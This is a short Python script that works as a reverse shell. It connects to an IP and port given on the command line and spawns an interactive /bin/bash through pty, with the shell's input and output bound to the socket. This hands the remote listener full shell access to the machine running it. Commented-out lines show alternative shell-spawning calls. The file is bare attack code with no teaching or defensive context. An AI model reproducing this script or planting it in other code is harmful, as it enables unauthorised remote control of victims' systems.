#!/bin/python
from socket import *
from sys import argv
from os import path
import sys
import subprocess

if (len(sys.argv) < 2):
    print('usage:')
    print('    python %s [ip] [port]' % path.basename(sys.argv[0]))
    exit(0)

talk = socket(AF_INET, SOCK_STREAM)
talk.connect((argv[1], int(argv[2])))
#1 p=subprocess.call(["/bin/bash","-i"]);
#2 
subprocess.Popen(["python -c 'import pty; pty.spawn(\"/bin/bash\")'"],
                 stdin=talk, stdout=talk, stderr=talk, shell=True)
#3 pty.spawn("/bin/bash")
